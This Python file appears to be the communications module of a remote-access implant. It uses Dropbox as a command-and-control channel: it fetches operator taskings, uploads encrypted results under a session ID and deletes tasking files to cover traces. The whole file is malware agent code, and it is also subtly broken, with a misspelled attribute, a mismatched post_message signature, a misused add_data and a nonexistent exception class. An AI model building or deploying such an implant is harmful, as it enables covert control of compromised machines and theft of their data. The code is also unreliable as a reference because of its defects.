import base64
import random
import sys
import urllib
import urllib.request


class ExtendedPacketHandler(PacketHandler):
    def __init__(self, agent, staging_key, session_id, headers, server, taskings_folder, results_folder, key=None):
        super().__init__(agent=agent, staging_key=staging_key, session_id=session_id, key=key)
        self.headers = headers
        self.server = server
        self.taskings_folder = taskings_folder
        self.results_folder = results_folder

    def send_message(self, packets=None):
        # Requests a tasking or posts data to a randomized tasking URI.
        # If packets == None, the agent GETs a tasking from the control server.
        # If packets != None, the agent encrypts the passed packets and
        #    POSTs the data to the control server.
        self.taskings_folder = "{{ taskings_folder }}"
        self.results_folder = "{{ results_folder }}"
        data = None
        try:
            del self.headers["Content-Type"]
        except Exception:
            pass

        if packets:
            # aes_encrypt_then_hmac is in stager.py
            enc_data = aes_encrypt_then_hmac(self.key, packets)
            data = self.build_routing_packet(self.staging_key, self.session_id, meta=5, enc_data=enc_data)
            # check to see if there are any results already present

            self.headers["Dropbox-API-Arg"] = '{"path":"%s/%s.txt"}' % (self.results_folder, self.session_id)

            try:
                pkdata = self.post_message(
                    "https://content.dropboxapi.com/2/files/download",
                    data=None,
                    headers=self.headers,
                )
            except Exception:
                pkdata = None

            if pkdata and len(pkdata) > 0:
                data = pkdata + data

            self.headers["Content-Type"] = "application/octet-stream"
            request_uri = "https://content.dropboxapi.com/2/files/upload"
        else:
            self.headers["Dropbox-API-Arg"] = '{"path":"%s/%s.txt"}' % (
                self.taskings_folder,
                self.session_id
            )
            request_uri = "https://content.dropboxapi.com/2/files/download"

        try:
            result_data = self.post_message(request_uri, data, self.headers)
            if (result_data and len(result_data) > 0) and request_uri.endswith("download"):
                self.headers["Content-Type"] = "application/json"
                del self.headers["Dropbox-API-Arg"]
                data_string = '{"path":"%s/%s.txt"}' % (self.askings_folder, self.session_id)
                nothing = self.post_message(
                    "https://api.dropboxapi.com/2/files/delete_v2", data_string, self.headers
                )

            return ("200", result_data)

        except urllib.request.Request.HTTPError as HTTPError:
            # if the server is reached, but returns an error (like 404)
            return (HTTPError.code, "")

        except urllib.request.Request.URLError as URLerror:
            # if the server cannot be reached
            self.missedCheckins = self.missedCheckins + 1
            return (URLerror.reason, "")

        return ("", "")

    def post_message(self, uri, data=None):
        try:
            print("Sending request to:", uri)
            print("Headers:", self.headers)
            print("Data:", data)

            req = urllib.request.Request(uri)
            for key, value in self.headers.items():
                req.add_header("%s" % (key), "%s" % (value))

            if data:
                req.add_data = data

            proxy = urllib.request.ProxyHandler()
            o = urllib.request.build_opener(proxy)
            urllib.request.install_opener(o)
            return urllib.request.urlopen(req).read()

        except urllib.error.HTTPError as e:
            print("HTTP Error:", e.code, e.reason)
            print("Headers:", e.headers)
            return None
        except Exception as e:
            print("Error:")
            print(e)
            return None
